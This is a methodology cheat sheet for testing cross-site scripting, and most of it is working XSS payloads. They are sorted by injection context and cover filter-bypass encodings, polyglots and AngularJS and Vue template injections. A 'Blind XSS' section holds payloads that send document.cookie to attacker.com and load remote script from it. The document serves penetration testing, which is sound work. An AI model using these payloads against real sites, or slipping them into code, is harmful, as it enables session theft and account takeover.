# Cross-Site Scripting (XSS) Testing Methodology

## Quick Reference

**Basic Payloads:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

**Event Handler Payloads:**
```html
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='
" onclick="alert(1)
```

---

## XSS Types

### Reflected XSS
User input immediately reflected in response without proper encoding.

### Stored XSS
User input stored server-side, displayed to other users without encoding.

### DOM-based XSS
Client-side JavaScript processes user input unsafely.

---

## Injection Context Patterns

### Pattern 1: HTML Body Context

**Scenario:** Input rendered directly in HTML body

```html
<div>Welcome, ${input}!</div>
```

**Payloads:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

### Pattern 2: HTML Attribute Context

**Scenario:** Input placed inside an attribute value

```html
<input value="${input}">
```

**Payloads:**
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%"
"><script>alert(1)</script>
" onmouseover=alert(1) x="
'/onclick='alert(1)'//
```

### Pattern 3: JavaScript String Context

**Scenario:** Input placed inside JavaScript string

```javascript
var name = "${input}";
```

**Payloads:**
```javascript
";alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

### Pattern 4: JavaScript Template Literal

**Scenario:** Input in template literal

```javascript
var msg = `Hello ${input}`;
```

**Payloads:**
```javascript
${alert(1)}
`-alert(1)-`
```

### Pattern 5: URL/href Context

**Scenario:** Input used in URL attribute

```html
<a href="${input}">Link</a>
```

**Payloads:**
```
javascript:alert(1)
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Pattern 6: CSS Context

**Scenario:** Input in style attribute or CSS

```html
<div style="color: ${input}">
```

**Payloads:**
```css
red;}</style><script>alert(1)</script>
expression(alert(1))  /* IE only */
url(javascript:alert(1))
```

### Pattern 7: Inside HTML Comments

**Scenario:** Input rendered in HTML comment

```html
<!-- User: ${input} -->
```

**Payloads:**
```html
--><script>alert(1)</script><!--
--><img src=x onerror=alert(1)><!--
```

### Pattern 8: Inside Script Tag (Non-String)

**Scenario:** Input directly in script

```javascript
var x = ${input};
```

**Payloads:**
```javascript
1;alert(1)
1+alert(1)
[alert(1)]
{alert:alert(1)}
```

---

## DOM-Based XSS Sources and Sinks

### Common Sources (User-Controlled Data)
```javascript
location.hash
location.search
location.href
document.referrer
document.cookie
window.name
localStorage/sessionStorage
postMessage data
```

### Common Sinks (Dangerous Functions)
```javascript
// Direct execution
eval()
Function()
setTimeout/setInterval (with string)
setImmediate()

// HTML injection
innerHTML
outerHTML
document.write/writeln
insertAdjacentHTML

// URL sinks
location
location.href
location.assign()
location.replace()

// Script injection
<script>.src
<script>.text
```

### DOM XSS Payloads

**Via location.hash:**
```
https://target.com/page#<img src=x onerror=alert(1)>
```

**Via postMessage:**
```javascript
// On attacker page
targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');
```

---

## Filter Bypass Techniques

### Tag Variations
```html
<ScRiPt>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script/src="data:,alert(1)">
```

### Event Handler Variations
```html
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
<img src=x onerror=alert`1`>
<img src=x oNerRor=alert(1)>
<img/src=x/onerror=alert(1)>
```

### Without Parentheses
```html
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
<img src=x onerror="window.alert?.(1)">
<svg onload=alert&lpar;1&rpar;>
```

### Without Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<body/onload=alert(1)>
```

### Encoding Bypasses

**HTML Entity Encoding:**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

**URL Encoding:**
```
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src=x%20onerror=alert(1)%3E
```

**Unicode Escapes (in JS):**
```javascript
\u0061\u006c\u0065\u0072\u0074(1)  // alert(1)
```

**Base64:**
```html
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
```

### Alternative Tags
```html
<svg onload=alert(1)>
<body onload=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```

### JavaScript Protocol Variations
```
javascript:alert(1)
JAVASCRIPT:alert(1)
java%0ascript:alert(1)
java%09script:alert(1)
java%0dscript:alert(1)
&#106;avascript:alert(1)
&#x6a;avascript:alert(1)
```

### Breaking Out of Attributes
```html
" onclick="alert(1)
' onclick='alert(1)
`onclick=alert(1)
" onmouseover="alert(1)" style="position:fixed;width:100%;height:100%;top:0;left:0;
```

---

## Polyglot Payloads

Work across multiple contexts:

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

```html
'">><marquee><img src=x onerror=alert(1)></marquee></textarea><style><!--</style>
```

```html
"><img src=x id=`<img src=x onerror=alert(1)>
```

```html
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
```

---

## Framework-Specific XSS

### AngularJS (Template Injection)
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{'a]'.constructor.prototype.charAt=[].join;$eval('x]alert(1)');}}
```

### Vue.js
```
{{_c.constructor('alert(1)')()}}
{{toString.constructor.call({},alert,1)}}
```

### React (via dangerouslySetInnerHTML)
Look for components using `dangerouslySetInnerHTML` with user input.

### jQuery
```javascript
$('<img src=x onerror=alert(1)>')
$.html('<script>alert(1)</script>')
```

---

## Stored XSS Vectors

Common injection points:
- User profile fields (name, bio, website)
- Comments/reviews
- Forum posts
- File names
- Email headers
- Log entries displayed in admin panels

---

## Blind XSS

For admin panels or delayed execution:

```html
<script src="https://attacker.com/xss.js"></script>
<img src=x onerror="(new Image()).src='https://attacker.com/?c='+document.cookie">
```

**XSS Hunter Payloads:**
```html
"><script src=https://xss.attacker.com></script>
"><img src=x onerror=this.src='https://xss.attacker.com/?c='+document.cookie>
```

---

## mXSS (Mutation XSS)

Exploits browser parsing differences:

```html
<p id=<img src=x onerror=alert(1)//>test</p>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

---

## Verification Checklist

1. **Identify reflection point:**
   - [ ] Input appears in response body
   - [ ] Determine context (HTML body, attribute, JS, etc.)

2. **Test basic payloads:**
   - [ ] `<script>alert(1)</script>`
   - [ ] `<img src=x onerror=alert(1)>`
   - [ ] Event handlers in context

3. **Test filter bypass:**
   - [ ] Case variations
   - [ ] Encoding (HTML entities, URL encoding)
   - [ ] Alternative tags and events

4. **Confirm execution:**
   - [ ] Alert box appears OR
   - [ ] Network request to attacker server
   - [ ] DOM modification

5. **Document evidence:**
   - [ ] Screenshot of execution
   - [ ] Working payload
   - [ ] Affected endpoint and parameter
